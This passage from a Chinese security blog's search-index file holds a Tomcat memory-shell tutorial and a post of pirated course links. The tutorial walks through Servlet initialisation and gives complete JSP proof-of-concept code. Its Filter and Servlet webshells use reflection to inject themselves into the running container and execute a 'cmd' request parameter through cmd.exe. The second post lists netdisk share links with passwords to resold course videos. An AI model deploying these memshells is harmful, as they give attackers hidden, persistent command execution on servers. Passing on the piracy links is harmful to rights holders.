StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    // 定义 Filter</span><br><span class="line">    Shell_Filter filter = new Shell_Filter();</span><br><span class="line">    String filterName = &quot;CommonFilter&quot;;</span><br><span class="line"></span><br><span class="line">    // 创建 FilterDef</span><br><span class="line">    FilterDef filterDef = new FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    // 创建 FilterMap</span><br><span class="line">    FilterMap filterMap = new FilterMap();</span><br><span class="line">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">    // 通过反射获取 filterConfigs 并添加新 filter</span><br><span class="line">    Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">    filterConfigsField.setAccessible(true);</span><br><span class="line">    Map filterConfigs = (Map) filterConfigsField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    // 反射创建 ApplicationFilterConfig</span><br><span class="line"></span><br><span class="line">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">    filterConfigs.put(filterName, filterConfig);</span><br><span class="line">    response.getWriter().println(&quot;Injection successful!&quot;);</span><br><span class="line"></span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">    e.printStackTrace(response.getWriter());</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先访问jsp文件</p><p><img src="/./../img/ma/image-20250221130802895.png" alt="image-20250221130802895"></p><p>再访问任意路由执行命令</p><p><img src="/./../img/ma/image-20250221130853382.png" alt="image-20250221130853382"></p><h3 id="Servlet型内存马"><a href="#Servlet型内存马" class="headerlink" title="Servlet型内存马"></a>Servlet型内存马</h3><h4 id="编写一个简单的Servlet"><a href="#编写一个简单的Servlet" class="headerlink" title="编写一个简单的Servlet"></a>编写一个简单的Servlet</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.example.Servletshell;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Myservlet  extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        resp.getWriter().println(&quot;myservlet&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>web.xml配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;Myservlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.Servletshell.Myservlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Myservlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/my&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>访问&#x2F;my</p><p><img src="/./../img/ma/image-20250221134435949.png" alt="image-20250221134435949"></p><h4 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h4><p>先看调用栈</p><p><img src="/./../img/ma/image-20250221184859855.png" alt="image-20250221184859855"></p><p>我们知道wrapper负责封装Servlet，因此我们从Wrapper的创建开始来探究Servlet的初始化流程。于是我们来到ContextConfig#configureContext</p><p><img src="/./../img/ma/image-20250221180647327.png" alt="image-20250221180647327"></p><p>接下来我们看ContextConfig#configureContext中的这段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">for (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            Wrapper wrapper = context.createWrapper();</span><br><span class="line">            //控制 Servlet 在 Web 应用启动时是否提前加载，以及确定加载的顺序</span><br><span class="line">            if (servlet.getLoadOnStartup() != null) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            if (servlet.getEnabled() != null) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            //设置ServletName属性</span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            for (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            for (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            //设置ServletClass属性</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            MultipartDef multipartdef = servlet.getMultipartDef();</span><br><span class="line">            if (multipartdef != null) &#123;</span><br><span class="line">                long maxFileSize = -1;</span><br><span class="line">                long maxRequestSize = -1;</span><br><span class="line">                int fileSizeThreshold = 0;</span><br><span class="line"></span><br><span class="line">                if(null != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                if(null != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                if(null != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(new MultipartConfigElement(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            if (servlet.getAsyncSupported() != null) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            //将包装好的StandWrapper添加进ContainerBase的children属性中</span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        //添加路径映射</span><br><span class="line">        for (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>解析 web.xml 文件中的 servlet 配置，将 servlet 及其属性（启动顺序、类名、参数等）注册到 Web 容器的 <code>context</code> 中，并设置 URL 映射。</p><p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p><ul><li>创建<code>Wapper</code>对象；</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li><li>设置<code>Servlet</code>的名称；</li><li>设置<code>Servlet</code>的<code>class</code>；</li><li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li><li>将<code>url</code>和<code>servlet</code>类做映射</li></ul><p><img src="/./../img/ma/image-20250219105450965.png" alt="image-20250219105450965"></p><p>接着我们查找谁调用了ContextConfig#configureContext</p><p><img src="/./../img/ma/image-20250221185136053.png" alt="image-20250221185136053"></p><p>点进去ContextConfig#webConfig</p><p>我们发现<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p><p><img src="/./../img/ma/image-20250221185436167.png" alt="image-20250221185436167"></p><p>接着我们跟着调用栈，从上往下跟到StandardContext#startInternal，通过findChildren()获取StandardWrapper类</p><p><img src="/./../img/ma/image-20250221220608281.png" alt="image-20250221220608281"></p><p>然后加载完listener、filter，通过<code>loadOnStartUp()</code>方法加载wrapper</p><p><img src="/./../img/ma/image-20250222000027721.png" alt="image-20250222000027721"></p><p>跟进loadOnStartup，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public boolean loadOnStartup(Container children[]) &#123;</span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();</span><br><span class="line">    for (Container child : children) &#123;</span><br><span class="line">        Wrapper wrapper = (Wrapper) child;</span><br><span class="line">        int loadOnStartup = wrapper.getLoadOnStartup();</span><br><span class="line">        if (loadOnStartup &lt; 0) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        Integer key = Integer.valueOf(loadOnStartup);</span><br><span class="line">        map.computeIfAbsent(key, k -&gt; new ArrayList&lt;&gt;()).add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        for (Wrapper wrapper : list) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; catch (ServletException e) &#123;</span><br><span class="line">                getLogger().error(</span><br><span class="line">                        sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;, getName(), wrapper.getName()),</span><br><span class="line">                        StandardWrapper.getRootCause(e));</span><br><span class="line">                if (getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loadOnStartup</code> 的标准值遵循 Servlet 规范：<strong>负值表示容器不自动加载（首次请求时初始化），0 或正值表示容器启动时按数值从小到大顺序加载</strong></p><h4 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h4><p>根据我们上面的分析可以得出以下结论：</p><p>如果我们想要写一个<code>Servlet</code>内存马，需要经过以下步骤：</p><ul><li>寻找<code>StandardContext</code></li><li>继承并编写一个恶意<code>servlet</code></li><li>创建<code>Wapper</code>对象</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</li><li>设置<code>Servlet</code>的<code>Name</code></li><li>设置<code>Servlet</code>对应的<code>Class</code></li><li>将<code>Servlet</code>添加到<code>context</code>的<code>children</code>中</li><li>将<code>url</code>路径和<code>servlet</code>类做映射</li></ul><p>完整poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  public class Memshell extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init() throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">      response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">      String  cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">      if(cmd != null)&#123;</span><br><span class="line">        Process p =  Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;);</span><br><span class="line">        InputStream input = p.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        response.getWriter().write(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while((line = br.readLine()) != null) &#123;</span><br><span class="line">          response.getWriter().write(line);</span><br><span class="line">        &#125;</span><br><span class="line">        response.getWriter().write(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        p.getOutputStream().close();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  //System.out.println(request.getServletContext());</span><br><span class="line">  Memshell memshell = new Memshell();</span><br><span class="line">  ServletContext servletContext = request.getServletContext();</span><br><span class="line">  Field contextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">  contextField.setAccessible(true);</span><br><span class="line">  ApplicationContext applicationContext = (ApplicationContext)contextField.get(servletContext);</span><br><span class="line">  Field applicationContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">  applicationContextField.setAccessible(true);</span><br><span class="line">  StandardContext standardContext = (StandardContext)applicationContextField.get(applicationContext);</span><br><span class="line">  Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">  wrapper.setName(&quot;memshell&quot;);</span><br><span class="line">  wrapper.setServletClass(memshell.getClass().getName());</span><br><span class="line">  wrapper.setServlet(memshell);</span><br><span class="line">  standardContext.addChild(wrapper);</span><br><span class="line">  standardContext.addServletMappingDecoded(&quot;/shell&quot;, &quot;memshell&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>访问memshell.jsp文件</p><p>访问对应路径进行命令执行</p><p><img src="/./../img/ma/image-20250222002830136.png" alt="image-20250222002830136"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>写这篇关于传统Web应用内存马（Tomcat内存马）的文章时，我深刻感受到自己在安全技术领域仍有许多不足之处。尽管我通过学习和实践积累了一些经验，但在分析和理解这一领域复杂性时，依然存在许多盲点和不足。每次思考和写作时，我都能感受到自己的技术水平还不够成熟，很多细节和安全策略需要进一步完善。</p><p>这篇文章的完成，也让我更加意识到，网络安全是一个永无止境的学习过程。随着技术的不断发展和攻击手段的不断演进，我们必须时刻保持谦虚，保持对新技术的敏感，并不断提升自己的能力。在未来的工作中，我会继续深入探索和研究，努力弥补现有的不足，提升自己的技术水平，以便更好地应对日益复杂的网络安全挑战。</p><p>希望这篇文章能够为读者提供一些参考，也希望能得到更多来自朋友的指导和建议，共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/23/hello-world/"/>
      <url>/2025/02/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>首先你要开心，剩下的无所谓，日子长长总会如愿以偿。</p><p>首先说明下，现在手里资料很多，光复制粘贴手都麻了，所以想看什么学习的课程直接联系我qq(3238554134),我直接找到推到网站。</p><p>正常注册百度网盘只有200G空间，但是以下的链接可以领取大约400G，有效期为一个月，但是每个月都能领取。以下的课程只需要你们选取自己需要的，直接保存进你们自己的网盘，然后会自动更新（都是最新的课程）。这些视频的来源不想多解释，视屏里可能会出现某些卖课机构的水印，无需多理。有的过期了，直接联系我就行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/comps/view/MV84NTZfMTAzMF8yODU2X29ubGluZQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至于下载速度问题，别傻乎乎地原价充vip，以下是学生认证优惠。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/comps/view/MV8xMTE2XzEzODVfMzk1NF9vbmxpbmU=?active_svip=1y_auto&amp;activetab=svip&amp;from=shequn&amp;activity_id=132686988468&amp;ext=%7B%22bcode%22%3A%2283393974a85c1375873a3b77a755127d8133337fa257167783383374a25b1573803f3177a05f1c7685%22%7D</span><br></pre></td></tr></table></figure><h2 id="考研"><a href="#考研" class="headerlink" title="考研"></a>考研</h2><h3 id="26考研公共课"><a href="#26考研公共课" class="headerlink" title="26考研公共课"></a>26考研公共课</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.quark.cn/s/40bf68464c3a#/list/share</span><br><span class="line">https://pan.baidu.com/share/init?surl=j6Y_vDIe7w32ttnFaDAF-w&amp;<span class="built_in">pwd</span>=6666</span><br></pre></td></tr></table></figure><h3 id="26考研专业课"><a href="#26考研专业课" class="headerlink" title="26考研专业课"></a>26考研专业课</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://pan.quark.cn/s/7a0cf5916225#/list/share</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/share/init?surl=n9Av7geDFWDpvXMot-CBgQ&amp;<span class="built_in">pwd</span>=6666</span><br></pre></td></tr></table></figure><h2 id="25四六级"><a href="#25四六级" class="headerlink" title="25四六级"></a>25四六级</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=d9umNISloYFtmrwBx1DF3Q&amp;<span class="built_in">pwd</span>=6666</span><br><span class="line">https://pan.baidu.com/s/1d9umNISloYFtmrwBx1DF3Q?<span class="built_in">pwd</span>=6666#list/path=%2F</span><br></pre></td></tr></table></figure><h2 id="教资、"><a href="#教资、" class="headerlink" title="教资、"></a>教资、</h2><p>2025山东教基</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=B7w2zmutZjth5qsRQqGKdQ&amp;<span class="built_in">pwd</span>=6666</span><br><span class="line">https://pan.quark.cn/s/d1cbb8b723c0#/list/share</span><br><span class="line">https://pan.baidu.com/share/init?surl=cby6v-GPTximN1khV0_46Q&amp;<span class="built_in">pwd</span>=6666</span><br><span class="line">https://pan.baidu.com/share/init?surl=bIoerwvkzVxZmzOCTmexpg&amp;<span class="built_in">pwd</span>=6666</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2025全国教综</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=I2cTs60V1gmq2z5r6gRgjg&amp;pwd=6666</span><br></pre></td></tr></table></figure><p>2025年教招语文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.quark.cn/s/6e0831b350e2#/list/share</span><br></pre></td></tr></table></figure><p>2025上中学系统班</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=3a8fjqWMTiBq932bSRFSLQ&amp;pwd=6666</span><br></pre></td></tr></table></figure><p>2025上小学系统班</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=ULOQh2gA1mVX-4Cr8uF5hA&amp;pwd=6666</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -学习资料 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
